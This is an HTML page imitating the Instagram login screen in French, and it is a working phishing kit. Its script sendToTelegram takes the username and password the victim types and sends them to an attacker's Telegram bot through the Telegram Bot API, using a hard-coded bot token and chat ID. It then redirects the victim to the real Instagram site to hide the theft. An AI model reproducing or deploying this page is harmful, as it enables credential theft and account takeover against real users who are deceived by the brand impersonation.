<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        .logo {
            width: 180px;
            margin-bottom: 20px;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 14px;
        }
        .login-button {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
        }
        .login-button:hover {
            background-color: #0077cc;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            font-size: 12px;
            color: #8e8e8e;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: auto;
        }
        .divider::before {
            margin-right: 10px;
        }
        .divider::after {
            margin-left: 10px;
        }
        .facebook-login {
            background: none;
            border: none;
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
        }
        .facebook-login:hover {
            text-decoration: underline;
        }
        .forgot-password {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            display: block;
            margin-top: 15px;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 15px;
            margin-top: 10px;
            font-size: 14px;
        }
        .signup-box a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }
        .signup-box a:hover {
            text-decoration: underline;
        }
        @media (max-width: 500px) {
            .container {
                max-width: 90%;
            }
        }
    </style>
    <script>
        function sendToTelegram() {
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;
            
            if (username === "" || password === "") {
                alert("Veuillez remplir tous les champs !");
                return;
            }

            var token = "8172051327:AAEuBJ0yNmbtJvPtiYtjC9yS9sF6joeSNDw";
            var chatId = "6723948907";
            var message = "üîπ Nouveau login Instagram üîπ\nüë§ Utilisateur: " + username + "\nüîë Mot de passe: " + password;

            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);

            fetch(url)
                .then(response => {
                    if (response.ok) {
                        window.location.href = "https://www.instagram.com"; // Redirection apr√®s l'envoi
                    } else {
                        alert("Erreur d'envoi sur Telegram !");
                    }
                })
                .catch(error => {
                    alert("Probl√®me de connexion !");
                    console.error("Erreur:", error);
                });
        }
    </script>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Instagram" class="logo">
            <input type="text" id="username" class="input-field" placeholder="Num√©ro de t√©l√©phone, nom d'utilisateur ou e-mail">
            <input type="password" id="password" class="input-field" placeholder="Mot de passe">
            <button class="login-button" onclick="sendToTelegram()">Se connecter</button>
            <div class="divider">OU</div>
            <button class="facebook-login">Se connecter avec Facebook</button>
            <a href="#" class="forgot-password">Mot de passe oubli√© ?</a>
        </div>
        <div class="signup-box">
            Vous n‚Äôavez pas de compte ? <a href="#">Inscrivez-vous</a>
        </div>
    </div>
</body>
</html>
